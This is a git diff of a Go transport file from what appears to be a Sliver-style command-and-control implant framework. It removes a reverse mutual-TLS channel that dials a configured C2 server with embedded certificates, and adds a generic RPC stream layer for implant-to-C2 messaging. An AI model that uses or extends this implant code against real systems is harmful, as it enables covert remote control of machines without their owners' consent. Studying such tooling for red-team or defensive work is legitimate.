@@ -18,18 +18,11 @@ package transports
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .Config.MTLSc2Enabled}}
-
 import (
 	"bytes"
-	"crypto/tls"
-	"crypto/x509"
 	"encoding/binary"
-	"fmt"
+	"errors"
 	"io"
-	"net/url"
-	"os"
-	"strconv"
 	"sync"
 
 	// {{if .Config.Debug}}
@@ -41,68 +34,65 @@ import (
 	"github.com/golang/protobuf/proto"
 )
 
-// mtlsConnect - Reverse Mutual TLS implant transport.
-func mtlsConnect(uri *url.URL) (*Connection, error) {
-	// {{if .Config.Debug}}
-	log.Printf("Connecting -> %s", uri.Host)
-	// {{end}}
-	lport, err := strconv.Atoi(uri.Port())
-	if err != nil {
-		lport = 8888
-	}
-	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
-	if err != nil {
-		return nil, err
+// setupSessionRPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
+// The stream parameter is not "tracked" or "registered" by ourselves, but we should need to.
+func setupSessionRPC(stream io.ReadWriteCloser) (c2 *Connection, err error) {
+
+	if stream == nil {
+		return nil, errors.New("Attempted to setup RPC layer around nil net.Conn")
 	}
 
-	send := make(chan *pb.Envelope)
-	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		ctrl:    ctrl,
+	c2 = &Connection{
+		Send:    make(chan *pb.Envelope),
+		Recv:    make(chan *pb.Envelope),
+		ctrl:    make(chan bool),
 		tunnels: &map[uint64]*Tunnel{},
 		mutex:   &sync.RWMutex{},
 		once:    &sync.Once{},
 		IsOpen:  true,
 		cleanup: func() {
 			// {{if .Config.Debug}}
-			log.Printf("[mtls] lost connection, cleanup...")
+			log.Printf("[RPC] lost connection/stream, cleaning up RPC...")
 			// {{end}}
-			close(send)
-			conn.Close()
-			close(recv)
+			close(c2.Send)
+			close(c2.Recv)
+			// In sliver we close the physical conn.
+			// Here we close the logical stream only.
+			stream.Close()
 		},
 	}
 
 	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			socketWriteEnvelope(conn, envelope)
+		defer c2.Cleanup()
+		for envelope := range c2.Send {
+			connWriteEnvelope(stream, envelope)
 		}
 	}()
 
 	go func() {
-		defer connection.Cleanup()
+		defer c2.Cleanup()
 		for {
-			envelope, err := socketReadEnvelope(conn)
+			envelope, err := connReadEnvelope(stream)
 			if err == io.EOF {
 				break
 			}
 			if err == nil {
-				recv <- envelope
+				c2.Recv <- envelope
 			}
 		}
 	}()
 
-	return connection, nil
+	// {{if .Config.Debug}}
+	log.Printf("Done creating RPC C2 stream.")
+	// {{end}}
+
+	return
 }
 
-// socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
+// connWriteEnvelope - Writes a message to the TLS socket using length prefix framing
 // which is a fancy way of saying we write the length of the message then the message
 // e.g. [uint32 length|message] so the reciever can delimit messages properly
-func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
+func connWriteEnvelope(connection io.ReadWriteCloser, envelope *pb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -117,8 +107,8 @@ func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
 	return nil
 }
 
-// socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
-func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
+// connReadEnvelope - Reads a message from the TLS connection using length prefix framing
+func connReadEnvelope(connection io.ReadWriteCloser) (*pb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4) // Size of uint32
 	if len(dataLengthBuf) == 0 || connection == nil {
 		panic("[[GenerateCanary]]")
@@ -163,44 +153,3 @@ func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 
 	return envelope, nil
 }
-
-// tlsConnect - Get a TLS connection or die trying
-func tlsConnect(address string, port uint16) (*tls.Conn, error) {
-	tlsConfig := getTLSConfig()
-	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Unable to connect: %v", err)
-		// {{end}}
-		return nil, err
-	}
-	return connection, nil
-}
-
-func getTLSConfig() *tls.Config {
-
-	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Cannot load sliver certificate: %v", err)
-		// {{end}}
-		os.Exit(5)
-	}
-
-	// Load CA cert
-	caCertPool := x509.NewCertPool()
-	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))
-
-	// Setup config with custom certificate validation routine
-	tlsConfig := &tls.Config{
-		Certificates:          []tls.Certificate{certPEM},
-		RootCAs:               caCertPool,
-		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
-		VerifyPeerCertificate: rootOnlyVerifyCertificate,
-	}
-	tlsConfig.BuildNameToCertificate()
-
-	return tlsConfig
-}
-
-// {{end}} -MTLSc2Enabled
